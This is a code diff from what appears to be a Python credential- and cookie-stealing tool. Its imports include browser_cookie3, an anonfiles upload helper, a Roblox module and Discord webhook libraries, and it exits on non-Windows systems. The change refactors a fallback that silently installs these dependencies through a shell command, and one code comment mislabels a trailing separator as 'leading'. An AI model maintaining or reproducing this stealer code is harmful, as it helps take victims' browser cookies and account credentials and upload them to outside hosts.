@@ -36,9 +36,11 @@ try:
     import browser_cookie3
     from anonFile import uploadToAnonfiles
     from _roblox import RobloxX
-except:
+except Exception:
     import subprocess
-    subprocess.run("python -m pip install requests && python -m pip install Pillow && python -m pip install pycryptodome && python -m pip install psutil && python -m pip install WMI && python -m pip install discord && python -m pip install dhooks && python -m pip install browser_cookie3", shell=True)
+    requirements = ["requests", "Pillow", "pycryptodome", "psutil", "WMI", "discord", "dhooks", "browser_cookie3"]
+    command = " ".join([f"python -m pip install {requirement} &&" for requirement in requirements])[0:-3] # the [0:-3] removes the leading " &&"
+    subprocess.run(command, shell=True)
 
 if platform.system() != "Windows":
     quit()
